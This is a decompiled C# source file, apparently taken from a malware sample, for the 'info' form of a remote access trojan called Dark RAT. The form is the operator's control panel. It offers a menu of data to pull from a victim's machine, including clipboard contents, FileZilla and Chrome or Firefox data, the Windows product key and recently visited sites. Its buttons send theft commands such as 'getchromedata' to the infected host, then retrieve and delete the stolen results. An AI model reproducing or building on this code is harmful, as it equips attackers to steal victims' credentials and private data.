// Decompiled with JetBrains decompiler
// Type: Dark_RAT.info
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class info : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("Button3")]
    private Button _Button3;
    [AccessedThroughProperty("ComboBox1")]
    private ComboBox _ComboBox1;
    [AccessedThroughProperty("RichTextBox1")]
    private RichTextBox _RichTextBox1;

    [DebuggerNonUserCode]
    static info()
    {
    }

    [DebuggerNonUserCode]
    public info()
    {
      this.Load += new EventHandler(this.info_Load);
      info.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (info.__ENCList)
      {
        if (info.__ENCList.Count == info.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (info.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (info.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                info.__ENCList[index1] = info.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          info.__ENCList.RemoveRange(index1, checked (info.__ENCList.Count - index1));
          info.__ENCList.Capacity = info.__ENCList.Count;
        }
        info.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (info));
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.Button3 = new Button();
      this.ComboBox1 = new ComboBox();
      this.RichTextBox1 = new RichTextBox();
      this.SuspendLayout();
      this.Button1.Image = (Image) componentResourceManager.GetObject("Button1.Image");
      this.Button1.ImageAlign = ContentAlignment.MiddleLeft;
      Button button1_1 = this.Button1;
      Point point1 = new Point(12, 254);
      Point point2 = point1;
      button1_1.Location = point2;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      Size size1 = new Size(226, 23);
      Size size2 = size1;
      button1_2.Size = size2;
      this.Button1.TabIndex = 0;
      this.Button1.Text = "REQUEST";
      this.Button1.UseVisualStyleBackColor = true;
      this.Button2.Image = (Image) componentResourceManager.GetObject("Button2.Image");
      this.Button2.ImageAlign = ContentAlignment.MiddleLeft;
      Button button2_1 = this.Button2;
      point1 = new Point(239, 254);
      Point point3 = point1;
      button2_1.Location = point3;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(226, 23);
      Size size3 = size1;
      button2_2.Size = size3;
      this.Button2.TabIndex = 1;
      this.Button2.Text = "GET";
      this.Button2.UseVisualStyleBackColor = true;
      this.Button3.Image = (Image) componentResourceManager.GetObject("Button3.Image");
      this.Button3.ImageAlign = ContentAlignment.MiddleLeft;
      Button button3_1 = this.Button3;
      point1 = new Point(12, 283);
      Point point4 = point1;
      button3_1.Location = point4;
      this.Button3.Name = "Button3";
      Button button3_2 = this.Button3;
      size1 = new Size(453, 23);
      Size size4 = size1;
      button3_2.Size = size4;
      this.Button3.TabIndex = 3;
      this.Button3.Text = "DELETE";
      this.Button3.UseVisualStyleBackColor = true;
      this.ComboBox1.FormattingEnabled = true;
      this.ComboBox1.Items.AddRange(new object[10]
      {
        (object) "Clipboard",
        (object) "FileZilla Data",
        (object) "Chrome",
        (object) "Camstasia Licence",
        (object) "Windows Wallpaper Path",
        (object) "SAMP Server Data",
        (object) "Windows Product Key",
        (object) "Firefox Data",
        (object) "Last 25 Sites",
        (object) "Default Browser Path"
      });
      ComboBox comboBox1_1 = this.ComboBox1;
      point1 = new Point(12, 227);
      Point point5 = point1;
      comboBox1_1.Location = point5;
      this.ComboBox1.Name = "ComboBox1";
      ComboBox comboBox1_2 = this.ComboBox1;
      size1 = new Size(453, 21);
      Size size5 = size1;
      comboBox1_2.Size = size5;
      this.ComboBox1.TabIndex = 4;
      RichTextBox richTextBox1_1 = this.RichTextBox1;
      point1 = new Point(12, 12);
      Point point6 = point1;
      richTextBox1_1.Location = point6;
      this.RichTextBox1.Name = "RichTextBox1";
      this.RichTextBox1.ReadOnly = true;
      this.RichTextBox1.ScrollBars = RichTextBoxScrollBars.ForcedVertical;
      RichTextBox richTextBox1_2 = this.RichTextBox1;
      size1 = new Size(453, 209);
      Size size6 = size1;
      richTextBox1_2.Size = size6;
      this.RichTextBox1.TabIndex = 5;
      this.RichTextBox1.Text = "";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(478, 318);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.RichTextBox1);
      this.Controls.Add((Control) this.ComboBox1);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Button1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.Name = nameof (info);
      this.Text = "Info";
      this.ResumeLayout(false);
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        if (this._Button2 != null)
          this._Button2.Click -= eventHandler;
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += eventHandler;
      }
    }

    internal virtual Button Button3
    {
      [DebuggerNonUserCode] get => this._Button3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        if (this._Button3 != null)
          this._Button3.Click -= eventHandler;
        this._Button3 = value;
        if (this._Button3 == null)
          return;
        this._Button3.Click += eventHandler;
      }
    }

    internal virtual ComboBox ComboBox1
    {
      [DebuggerNonUserCode] get => this._ComboBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ComboBox1_SelectedIndexChanged);
        if (this._ComboBox1 != null)
          this._ComboBox1.SelectedIndexChanged -= eventHandler;
        this._ComboBox1 = value;
        if (this._ComboBox1 == null)
          return;
        this._ComboBox1.SelectedIndexChanged += eventHandler;
      }
    }

    internal virtual RichTextBox RichTextBox1
    {
      [DebuggerNonUserCode] get => this._RichTextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._RichTextBox1 = value;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.ComboBox1.Text, "Clipboard", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getclipboard|"));
      if (Operators.CompareString(this.ComboBox1.Text, "FileZilla Data", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getfilezilla|"));
      if (Operators.CompareString(this.ComboBox1.Text, "Camstasia Licence", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getcamstasialicence|"));
      if (Operators.CompareString(this.ComboBox1.Text, "Chrome", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getchromedata|"));
      if (Operators.CompareString(this.ComboBox1.Text, "Windows Wallpaper Path", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getwindowswallpaperpath|"));
      if (Operators.CompareString(this.ComboBox1.Text, "SAMP Server Data", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getsampserverdata|"));
      if (Operators.CompareString(this.ComboBox1.Text, "Windows Product Key", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getwindowsproductkey|"));
      if (Operators.CompareString(this.ComboBox1.Text, "Firefox Data", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|getfirefoxdata|"));
      if (Operators.CompareString(this.ComboBox1.Text, "Last 25 Sites", false) == 0)
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|last25sites|"));
      if (Operators.CompareString(this.ComboBox1.Text, "Default Browser Path", false) != 0)
        return;
      MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|defaultbrowser|"));
    }

    private void Button2_Click(object sender, EventArgs e) => this.RichTextBox1.Text = Conversions.ToString(MyProject.Forms.program.GetData());

    private void Button3_Click(object sender, EventArgs e) => MyProject.Forms.program.DeleteData();

    private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void info_Load(object sender, EventArgs e)
    {
    }
  }
}
